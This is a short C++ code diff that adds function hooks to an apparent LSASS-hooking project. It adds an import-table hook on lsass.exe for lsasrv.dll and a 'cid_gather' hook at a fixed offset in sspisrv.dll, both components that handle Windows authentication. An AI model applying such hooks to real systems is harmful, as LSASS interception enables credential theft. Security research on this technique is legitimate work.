@@ -16,8 +16,11 @@ int main( ) {
 
 	ipc::init( );
 
+	//hook::hook_iat( "lsa_test2.exe", "lsa_test2.exe" );
 	//hook::hook_iat( "harness.exe", "harness.exe" );
 	hook::hook_iat( "lsass.exe", "lsasrv.dll" );
+
+	hook::hook_cid_gather( "sspisrv.dll", 0x16F0, 13 );
 
 	gateway::init( );
 
